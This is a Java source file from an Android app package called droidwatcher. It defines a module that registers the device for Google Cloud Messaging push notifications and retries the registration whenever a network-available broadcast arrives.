package com.droidwatcher.modules;

import com.droidwatcher.Debug;
import com.droidwatcher.receivers.ConnectionReceiver;
import com.droidwatcher.security.SecuriryInfo;
import com.google.android.gcm.GCMRegistrar;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.support.v4.content.LocalBroadcastManager;

public class GCMModule {
	private Context mContext;
	private BroadcastReceiver mReceiver;
	public static Boolean registered = false;
	
	private final static String SENDER_ID = SecuriryInfo.GcmSenderId;
	
	public GCMModule(Context context){
		registered = false;
		
		this.mContext = context;
		this.mReceiver = new BroadcastReceiver() {
			@Override
			public void onReceive(Context context, Intent intent) {
				register();
			}
		};
	}
	
	public void start(){
		LocalBroadcastManager.getInstance(mContext).registerReceiver(mReceiver, new IntentFilter(ConnectionReceiver.NETWORK_AVAILABLE));
		register();
	}
	
	public void dispose(){
		try {
			LocalBroadcastManager.getInstance(mContext).unregisterReceiver(mReceiver);
		} catch (Exception e) {
			Debug.exception(e);
		}
	}
	
	public static void unregister(Context context){
		GCMRegistrar.setRegisteredOnServer(context, false);
		GCMModule.registered = false;
	}
	
	private void register(){
		if (registered){
			return;
		}
		
		try {
			GCMRegistrar.checkDevice(mContext);
			GCMRegistrar.checkManifest(mContext);
			final String regId = GCMRegistrar.getRegistrationId(mContext);
			if (regId.equals("") || !GCMRegistrar.isRegisteredOnServer(mContext)) {
			  GCMRegistrar.register(mContext.getApplicationContext(), SENDER_ID);
			} else {
				registered = true;
			}
		} catch (Exception e) {
			Debug.exception(e);
			//ErrorHandler.error(e, mContext);
		}
	}
}
